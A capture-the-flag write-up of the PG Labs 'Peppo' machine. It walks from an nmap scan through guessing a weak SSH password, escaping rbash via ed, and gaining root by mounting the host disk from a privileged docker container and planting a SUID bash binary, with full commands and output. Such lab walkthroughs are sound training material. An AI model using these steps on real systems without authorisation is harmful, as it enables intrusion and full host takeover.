## Peppo from PG Labs

## Nmap

The Peppo machine has been initiated with an nmap scan:

```sql
┌──(kali㉿kali)-[~/pglabs/peppo]
└─$ nmap 192.168.236.60 | tee nmap                         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 15:43 EST
Nmap scan report for 192.168.236.60
Host is up (0.047s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
113/tcp   open   ident
5432/tcp  open   postgresql
8080/tcp  open   http-proxy
10000/tcp open   snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 4.91 seconds

┌──(kali㉿kali)-[~/pglabs/peppo]
└─$ nmap 192.168.236.60 -p- -T4| tee nmapf
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 15:44 EST
Nmap scan report for 192.168.236.60
Host is up (0.043s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
113/tcp   open   ident
5432/tcp  open   postgresql
8080/tcp  open   http-proxy
10000/tcp open   snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 109.68 seconds

PORT      STATE SERVICE           VERSION                                                                                                                                       
22/tcp    open  ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)                                                                                                 
|_auth-owners: root                                                                                                                                                             
| ssh-hostkey:                                                                                                                                                                  
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)                                                                                                                  
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)                                                                                                                 
|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)                                                                                                               
113/tcp   open  ident             FreeBSD identd                                                                                                                                
|_auth-owners: nobody                                                                                                                                                           
5432/tcp  open  postgresql        PostgreSQL DB 9.6.0 or later                                                                                                                  
8080/tcp  open  http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))                                                                                                 
|_http-title: Redmine                                                                                                                                                           
| http-robots.txt: 4 disallowed entries                                                                                                                                         
|_/issues/gantt /issues/calendar /activity /search                                                                                                                              
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)                                                                                                                     
10000/tcp open  snet-sensor-mgmt?                                                                                                                                               
|_auth-owners: eleanor                                                                                                                                                          
| fingerprint-strings:                                                                                                                                                          
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, 
TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:                                                                                                                  
|     HTTP/1.1 400 Bad Request                                                                                                                                                  
|     Connection: close                                                                                                                                                         
|   FourOhFourRequest:                                                                                                                                                          
|     HTTP/1.1 200 OK                                                                                                                                                           
|     Content-Type: text/plain                                                                                                                                                  
|     Date: Sun, 01 Feb 2026 20:46:54 GMT
|     Connection: close
|     Hello World
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 01 Feb 2026 20:46:46 GMT
|     Connection: close
|_    Hello World
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.95%I=7%D=2/1%Time=697FBBB6%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nD
SF:ate:\x20Sun,\x2001\x20Feb\x202026\x2020:46:46\x

```

## User shell

The service ident running on port 113 shows which service runs on which user. Port 10000 was shown to be running on the user "eleanor". Credential guessing with the credentials: "eleanor:eleanor",
puts me in an rbash restricted environment. 

```bash
eleanor@peppo:~$ ls
bin  file.txt  helloworld  local.txt
eleanor@peppo:~$ ls bin
chmod  chown  ed  ls  mv  ping  sleep  touch
eleanor@peppo:~$ id
-rbash: id: command not found
eleanor@peppo:~$ echo $SHELL
/bin/rbash
```

Running commands other than `echo` and the ones inside `./bin` outputted that they don't exist. The command `ed` does seem like a potential escape vector, as the help output 
explains !command reads the output of said command.

```sql
eleanor@peppo:~$ ed --help
GNU Ed - The GNU line editor.

Usage: ed [options] [file]

Options:
  -h, --help                 display this help and exit
  -V, --version              output version information and exit
  -G, --traditional          run in compatibility mode
  -l, --loose-exit-status    exit with 0 status even if a command fails
  -p, --prompt=STRING        use STRING as an interactive prompt
  -r, --restricted           run in restricted mode
  -s, --quiet, --silent      suppress diagnostics
  -v, --verbose              be verbose
Start edit by reading in 'file' if given.
If 'file' begins with a '!', read output of shell command.

Exit status: 0 for a normal exit, 1 for environmental problems (file
not found, invalid flags, I/O errors, etc), 2 to indicate a corrupt or
invalid input file, 3 for an internal consistency error (eg, bug) which
caused ed to panic.

Report bugs to bug-ed@gnu.org
Ed home page: http://www.gnu.org/software/ed/ed.html
General help using GNU software: http://www.gnu.org/gethelp

```

Running `ed` with `!/bin/sh` gives me a shell
```sql
eleanor@peppo:~$ ed
!/bin/sh
$ /usr/bin/id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)

```

To increase the stability and reliability of the shell, a python pty has been spawned, alongside with adding `/bin` and `/usr/bin` to my `$PATH` variable.
```sql
$ /usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
eleanor@peppo:~$ export PATH="/bin:/usr/bin:/home/eleanor/bin"
eleanor@peppo:~$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)

```

## Shell as root

As eleanor is in the docker group, his user can run docker even with `--privileged`, which means root access can be attained from inside the container. As this machine doesn't have internet access, I've resorted to using images that are already installed, this has been
enumerated with:
```sql
eleanor@peppo:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        5 years ago         542MB
postgres            latest              adf2b126dda8        5 years ago         313MB

```

The privileged container has been created with:
```sql
eleanor@peppo:~$ docker run --privileged -it redmine /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

```

Now inside the container, I enumerated the existing storage(sda) files.
```sql
# ls /dev
agpgart           network_throughput  tty1   tty31  tty53    vcs2
autofs            null                tty10  tty32  tty54    vcs3
bsg               port                tty11  tty33  tty55    vcs4
btrfs-control     ppp                 tty12  tty34  tty56    vcs5
console           psaux               tty13  tty35  tty57    vcs6
core              ptmx                tty14  tty36  tty58    vcsa
cpu_dma_latency   pts                 tty15  tty37  tty59    vcsa1
cuse              random              tty16  tty38  tty6     vcsa2
dri               rtc0                tty17  tty39  tty60    vcsa3
fb0               sda                 tty18  tty4   tty61    vcsa4
fd                sda1                tty19  tty40  tty62    vcsa5
full              sda2                tty2   tty41  tty63    vcsa6
fuse              sda5                tty20  tty42  tty7     vfio
hpet              sg0                 tty21  tty43  tty8     vga_arbiter
input             sg1                 tty22  tty44  tty9     vhci
kmsg              shm                 tty23  tty45  ttyS0    vhost-net
loop-control      snapshot            tty24  tty46  ttyS1    vmci
mapper            snd                 tty25  tty47  ttyS2    vsock
mcelog            sr0                 tty26  tty48  ttyS3    zero
mem               stderr              tty27  tty49  uhid
memory_bandwidth  stdin               tty28  tty5   uinput
mqueue            stdout              tty29  tty50  urandom
net               tty                 tty3   tty51  vcs
network_latency   tty0                tty30  tty52  vcs1

```

To escalate privileges, I mounted `/dev/sda1` to `/mnt`

```bash
# mount /dev/sda1 /mnt

```

From here, I created a copy of the bash binary in `/tmp`, and gave it SUID privileges, meaning the EUID of whichever user runs the binary is set to 0 (root).

```sql
# cp /mnt/bin/bash /mnt/tmp/root
# chmod 4755 /mnt/tmp/root
# exit
eleanor@peppo:~$ ls -la /tmp/root
-rwsr-xr-x 1 root root 1099016 Feb  1 18:33 /tmp/root
eleanor@peppo:~$ /tmp/root -p
root-4.4# id
uid=1000(eleanor) gid=1000(eleanor) euid=0(root) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)

```

In this shell, every command is run with root privileges. Flags:
```sql
root-4.4# cat /home/eleanor/local.txt
f484304028f3ae76f5ea5873e2875c91
root-4.4# cat /root/proof.txt
606b79f2ece6f55b066f45c447e80a4f
root-4.4# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:d2:50:6d:91 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
5: vetha12462a@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 6e:5a:74:f3:69:ba brd ff:ff:ff:ff:ff:ff link-netnsid 0
8: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:9e:06:2e brd ff:ff:ff:ff:ff:ff
    inet 192.168.236.60/24 brd 192.168.236.255 scope global ens192
       valid_lft forever preferred_lft forever
36: veth4e470fe@if35: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether e6:26:f6:eb:ef:c4 brd ff:ff:ff:ff:ff:ff link-netnsid 1
38: veth44d4ca0@if37: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 12:70:c6:82:c1:d5 brd ff:ff:ff:ff:ff:ff link-netnsid 2
42: vethd65dc7f@if41: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 72:09:30:0c:a4:e5 brd ff:ff:ff:ff:ff:ff link-netnsid 3
```
